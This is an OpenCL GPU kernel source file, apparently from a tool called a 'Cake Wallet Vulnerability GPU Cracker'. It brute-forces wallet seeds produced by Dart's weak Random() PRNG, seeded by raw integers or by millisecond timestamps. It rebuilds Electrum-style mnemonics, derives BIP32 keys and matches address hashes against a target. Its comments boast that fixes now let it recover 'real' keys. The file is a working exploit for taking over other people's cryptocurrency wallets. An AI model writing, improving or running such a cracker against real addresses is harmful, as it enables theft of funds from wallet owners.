// Cake Wallet Vulnerability GPU Cracker
// Scans 2^32 possible Dart Random() seed values and checks 40 derived P2WPKH
// addresses (m/0'/{change}/{index}) per seed against a target Hash160.
//
// FIXED: The previous version used a fake LCG to generate entropy:
//     state = state * 0x5DEECE66DUL + 0xB;
//     bytes[i] = (state >> 24) & 0xFF;
// The constant 0x5DEECE66D is Java's java.util.Random multiplier — completely
// wrong for Dart. This means no real Cake Wallet seed could ever have been
// recovered. The correct implementation uses Dart's xorshift128+ PRNG
// initialized via two SplitMix64 steps (see dart_prng_init below).

// ─── Dart PRNG helpers ──────────────────────────────────────────────────────

static ulong cake_splitmix64(ulong *sm) {
    *sm += 0x9e3779b97f4a7c15UL;
    ulong z = *sm;
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9UL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBUL;
    return z ^ (z >> 31);
}

static void cake_dart_init(ulong seed, ulong *s0, ulong *s1) {
    ulong sm = seed;
    *s0 = cake_splitmix64(&sm);
    *s1 = cake_splitmix64(&sm);
    if (*s0 == 0UL && *s1 == 0UL) {
        *s0 = 0x9e3779b97f4a7c15UL;
        *s1 = 0x6c62272e07bb0142UL;
    }
}

static uchar cake_dart_byte(ulong *s0, ulong *s1) {
    ulong v0 = *s0, v1 = *s1;
    ulong result = v0 + v1;
    ulong s1x = v1 ^ v0;
    *s0 = rotate(v0, 55UL) ^ s1x ^ (s1x << 14);
    *s1 = rotate(s1x, 36UL);
    // nextInt(256)
    ulong x_hi = result >> 32;
    ulong x_lo = result & 0xFFFFFFFFUL;
    ulong res  = (x_hi * 256UL) + ((x_lo * 256UL) >> 32);
    return (uchar)(res >> 32);
}

// ─── Electrum prefix check ───────────────────────────────────────────────────

// Returns 1 if HMAC-SHA512("Seed version", mnemonic) starts with hex "100".
static int cake_validate_electrum_prefix(
    __private uchar *mnemonic, int mnemonic_len)
{
    uchar key[12] = {'S','e','e','d',' ','v','e','r','s','i','o','n'};

    uchar ipad[128] __attribute__((aligned(4)));
    uchar opad[128] __attribute__((aligned(4)));
    for (int i = 0; i < 128; i++) {
        ipad[i] = (i < 12) ? (key[i] ^ 0x36) : 0x36;
        opad[i] = (i < 12) ? (key[i] ^ 0x5C) : 0x5C;
    }

    uchar inner[256] __attribute__((aligned(4)));
    for (int i = 0; i < 128; i++) inner[i] = ipad[i];
    for (int i = 0; i < mnemonic_len; i++) inner[128+i] = mnemonic[i];

    uchar inner_hash[64] __attribute__((aligned(8)));
    sha512((__private ulong*)inner, 128 + mnemonic_len, (__private ulong*)inner_hash);

    uchar outer[192] __attribute__((aligned(4)));
    for (int i = 0; i < 128; i++) outer[i] = opad[i];
    for (int i = 0; i < 64;  i++) outer[128+i] = inner_hash[i];

    uchar hmac[64] __attribute__((aligned(8)));
    sha512((__private ulong*)outer, 192, (__private ulong*)hmac);

    // "100" in hex: first byte = 0x10, second byte upper nibble = 0x00
    return (hmac[0] == 0x10) && ((hmac[1] >> 4) == 0x00);
}

// ─── Main kernel ─────────────────────────────────────────────────────────────

__kernel void cake_wallet_crack(
    __global ulong *results,        // 3 u64s per hit: seed, change, addr_idx
    __global uint  *result_count,
    ulong target_h160_part1,        // Hash160 bytes [0..8]  little-endian packed
    ulong target_h160_part2,        // Hash160 bytes [8..16] little-endian packed
    uint  target_h160_part3,        // Hash160 bytes [16..20] little-endian packed
    uint  offset
) {
    uint seed_index = get_global_id(0) + offset;

    // 1. Generate entropy via correct Dart xorshift128+ (FIXED)
    ulong s0, s1;
    cake_dart_init((ulong)seed_index, &s0, &s1);

    uchar entropy[16];
    for (int i = 0; i < 16; i++) {
        entropy[i] = cake_dart_byte(&s0, &s1);
    }

    // 2. BIP39 word indices (128-bit entropy, 4-bit checksum)
    uchar entropy_hash[32] __attribute__((aligned(4)));
    sha256((__private const uint*)entropy, 16, (__private uint*)entropy_hash);
    uchar checksum = (entropy_hash[0] >> 4) & 0x0F;

    ulong ehi = 0UL, elo = 0UL;
    for (int i = 0; i < 8; i++) ehi |= ((ulong)entropy[i])   << ((7-i)*8);
    for (int i = 0; i < 8; i++) elo |= ((ulong)entropy[i+8]) << ((7-i)*8);

    ushort widx[12];
    widx[0]  = (ushort)((ehi >> 53) & 0x7FF);
    widx[1]  = (ushort)((ehi >> 42) & 0x7FF);
    widx[2]  = (ushort)((ehi >> 31) & 0x7FF);
    widx[3]  = (ushort)((ehi >> 20) & 0x7FF);
    widx[4]  = (ushort)((ehi >>  9) & 0x7FF);
    widx[5]  = (ushort)(((ehi & 0x1FFUL) << 2) | ((elo >> 62) & 0x3));
    widx[6]  = (ushort)((elo >> 51) & 0x7FF);
    widx[7]  = (ushort)((elo >> 40) & 0x7FF);
    widx[8]  = (ushort)((elo >> 29) & 0x7FF);
    widx[9]  = (ushort)((elo >> 18) & 0x7FF);
    widx[10] = (ushort)((elo >>  7) & 0x7FF);
    widx[11] = (ushort)(((elo & 0x7FUL) << 4) | checksum);

    // 3. Build mnemonic string
    uchar mnemonic[180] = {0};
    int mnemonic_len = 0;
    for (int i = 0; i < 12; i++) {
        int w = widx[i];
        int l = word_lengths[w];
        for (int j = 0; j < l; j++) mnemonic[mnemonic_len++] = words[w][j];
        if (i < 11) mnemonic[mnemonic_len++] = ' ';
    }

    // 4. Validate Electrum prefix (quick filter: only ~1/4096 seeds pass)
    if (!cake_validate_electrum_prefix(mnemonic, mnemonic_len)) return;

    // 5. Electrum PBKDF2-HMAC-SHA512 (salt = "electrum", 2048 iterations)
    uchar ipad_key[128] __attribute__((aligned(4)));
    uchar opad_key[128] __attribute__((aligned(4)));
    for (int x = 0; x < 128; x++) {
        ipad_key[x] = (x < mnemonic_len) ? (mnemonic[x] ^ 0x36) : 0x36;
        opad_key[x] = (x < mnemonic_len) ? (mnemonic[x] ^ 0x5C) : 0x5C;
    }

    uchar salt[12] = {101,108,101,99,116,114,117,109, 0,0,0,1};
    uchar sha512_result[64] __attribute__((aligned(8)));
    uchar buf[256] __attribute__((aligned(4)));

    for (int x = 0; x < 128; x++) buf[x] = ipad_key[x];
    for (int x = 0; x < 12;  x++) buf[128+x] = salt[x];
    sha512((__private ulong*)buf, 140, (__private ulong*)sha512_result);

    for (int x = 0; x < 128; x++) buf[x] = opad_key[x];
    for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
    sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

    uchar seed[64] __attribute__((aligned(8)));
    for (int x = 0; x < 64; x++) seed[x] = sha512_result[x];

    for (int iter = 1; iter < 2048; iter++) {
        for (int x = 0; x < 128; x++) buf[x] = ipad_key[x];
        for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
        sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

        for (int x = 0; x < 128; x++) buf[x] = opad_key[x];
        for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
        sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

        for (int x = 0; x < 64; x++) seed[x] ^= sha512_result[x];
    }

    // 6. BIP32 derive m/0'/{change}/{addr_idx}  (40 checks per seed)
    extended_private_key_t master_key;
    new_master_from_seed(0, seed, &master_key);

    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, 0);

    for (uint change = 0; change <= 1; change++) {
        extended_private_key_t chain_key;
        normal_private_child_from_private(&account_key, &chain_key, change);

        for (uint addr_idx = 0; addr_idx < 20; addr_idx++) {
            extended_private_key_t address_key;
            normal_private_child_from_private(&chain_key, &address_key, addr_idx);

            extended_public_key_t address_pub;
            public_from_private(&address_key, &address_pub);

            uchar hash160[20];
            identifier_for_public_key(&address_pub, hash160);

            // Pack Hash160 for comparison
            ulong h1 = 0UL, h2 = 0UL;
            uint  h3 = 0U;
            for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])    << (i*8);
            for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8])  << (i*8);
            for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i+16]) << (i*8);

            if (h1 == target_h160_part1 &&
                h2 == target_h160_part2 &&
                h3 == target_h160_part3)
            {
                uint idx = atomic_inc(result_count);
                if (idx < 1024) {
                    results[idx * 3]     = (ulong)seed_index;
                    results[idx * 3 + 1] = (ulong)change;
                    results[idx * 3 + 2] = (ulong)addr_idx;
                }
            }
        }
    }
}

// =============================================================================
// cake_wallet_crack_ms — correct timestamp-based kernel
//
// The original cake_wallet_crack kernel took a 32-bit `offset` and treated
// (get_global_id(0) + offset) as the Dart Random() seed directly. But real
// Cake Wallet seeds are DateTime.now().microsecondsSinceEpoch — 64-bit values
// like 1609459200000000. Those never appear in a 32-bit space, so the original
// kernel could never find a real key.
//
// This kernel receives start_ms (a u64 millisecond timestamp) and computes:
//   seed_us = (start_ms + gid) * 1000
// which is exactly what Dart passed to Random().
// =============================================================================

__kernel void cake_wallet_crack_ms(
    __global ulong *results,         // 3 u64s per hit: ts_ms, change, addr_idx
    __global uint  *result_count,
    ulong target_h160_part1,         // Hash160 [0..8]  little-endian
    ulong target_h160_part2,         // Hash160 [8..16] little-endian
    uint  target_h160_part3,         // Hash160 [16..20] little-endian
    ulong start_ms                   // first millisecond timestamp in this batch
) {
    ulong gid    = get_global_id(0);
    ulong ts_ms  = start_ms + gid;
    ulong seed   = ts_ms * 1000UL;  // microseconds — what Dart received

    // 1. Dart xorshift128+ entropy (same helpers as cake_wallet_crack)
    ulong s0, s1;
    cake_dart_init(seed, &s0, &s1);

    uchar entropy[16];
    for (int i = 0; i < 16; i++) entropy[i] = cake_dart_byte(&s0, &s1);

    // 2. BIP39 word indices
    uchar entropy_hash[32] __attribute__((aligned(4)));
    sha256((__private const uint*)entropy, 16, (__private uint*)entropy_hash);
    uchar checksum = (entropy_hash[0] >> 4) & 0x0F;

    ulong ehi = 0UL, elo = 0UL;
    for (int i = 0; i < 8; i++) ehi |= ((ulong)entropy[i])   << ((7-i)*8);
    for (int i = 0; i < 8; i++) elo |= ((ulong)entropy[i+8]) << ((7-i)*8);

    ushort widx[12];
    widx[0]  = (ushort)((ehi >> 53) & 0x7FF);
    widx[1]  = (ushort)((ehi >> 42) & 0x7FF);
    widx[2]  = (ushort)((ehi >> 31) & 0x7FF);
    widx[3]  = (ushort)((ehi >> 20) & 0x7FF);
    widx[4]  = (ushort)((ehi >>  9) & 0x7FF);
    widx[5]  = (ushort)(((ehi & 0x1FFUL) << 2) | ((elo >> 62) & 0x3));
    widx[6]  = (ushort)((elo >> 51) & 0x7FF);
    widx[7]  = (ushort)((elo >> 40) & 0x7FF);
    widx[8]  = (ushort)((elo >> 29) & 0x7FF);
    widx[9]  = (ushort)((elo >> 18) & 0x7FF);
    widx[10] = (ushort)((elo >>  7) & 0x7FF);
    widx[11] = (ushort)(((elo & 0x7FUL) << 4) | checksum);

    // 3. Mnemonic string
    uchar mnemonic[180] = {0};
    int mnemonic_len = 0;
    for (int i = 0; i < 12; i++) {
        int w = widx[i];
        int l = word_lengths[w];
        for (int j = 0; j < l; j++) mnemonic[mnemonic_len++] = words[w][j];
        if (i < 11) mnemonic[mnemonic_len++] = ' ';
    }

    // 4. Electrum prefix filter (skips ~4095/4096 seeds cheaply)
    if (!cake_validate_electrum_prefix(mnemonic, mnemonic_len)) return;

    // 5. Electrum PBKDF2-HMAC-SHA512 (salt="electrum", 2048 iters)
    uchar ipad_key[128] __attribute__((aligned(4)));
    uchar opad_key[128] __attribute__((aligned(4)));
    for (int x = 0; x < 128; x++) {
        ipad_key[x] = (x < mnemonic_len) ? (mnemonic[x] ^ 0x36) : 0x36;
        opad_key[x] = (x < mnemonic_len) ? (mnemonic[x] ^ 0x5C) : 0x5C;
    }
    uchar salt[12] = {101,108,101,99,116,114,117,109, 0,0,0,1};
    uchar sha512_result[64] __attribute__((aligned(8)));
    uchar buf[256] __attribute__((aligned(4)));

    for (int x = 0; x < 128; x++) buf[x] = ipad_key[x];
    for (int x = 0; x < 12;  x++) buf[128+x] = salt[x];
    sha512((__private ulong*)buf, 140, (__private ulong*)sha512_result);
    for (int x = 0; x < 128; x++) buf[x] = opad_key[x];
    for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
    sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);

    uchar seed64[64] __attribute__((aligned(8)));
    for (int x = 0; x < 64; x++) seed64[x] = sha512_result[x];

    for (int iter = 1; iter < 2048; iter++) {
        for (int x = 0; x < 128; x++) buf[x] = ipad_key[x];
        for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
        sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);
        for (int x = 0; x < 128; x++) buf[x] = opad_key[x];
        for (int x = 0; x < 64;  x++) buf[128+x] = sha512_result[x];
        sha512((__private ulong*)buf, 192, (__private ulong*)sha512_result);
        for (int x = 0; x < 64; x++) seed64[x] ^= sha512_result[x];
    }

    // 6. BIP32 derive m/0'/{change}/{addr_idx}
    extended_private_key_t master_key;
    new_master_from_seed(0, seed64, &master_key);

    extended_private_key_t account_key;
    hardened_private_child_from_private(&master_key, &account_key, 0);

    for (uint change = 0; change <= 1; change++) {
        extended_private_key_t chain_key;
        normal_private_child_from_private(&account_key, &chain_key, change);

        for (uint addr_idx = 0; addr_idx < 20; addr_idx++) {
            extended_private_key_t address_key;
            normal_private_child_from_private(&chain_key, &address_key, addr_idx);

            extended_public_key_t address_pub;
            public_from_private(&address_key, &address_pub);

            uchar hash160[20];
            identifier_for_public_key(&address_pub, hash160);

            ulong h1 = 0UL, h2 = 0UL;
            uint  h3 = 0U;
            for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])    << (i*8);
            for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8])  << (i*8);
            for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i+16]) << (i*8);

            if (h1 == target_h160_part1 &&
                h2 == target_h160_part2 &&
                h3 == target_h160_part3)
            {
                uint idx = atomic_inc(result_count);
                if (idx < 1024) {
                    results[idx * 3]     = ts_ms;
                    results[idx * 3 + 1] = (ulong)change;
                    results[idx * 3 + 2] = (ulong)addr_idx;
                }
            }
        }
    }
}
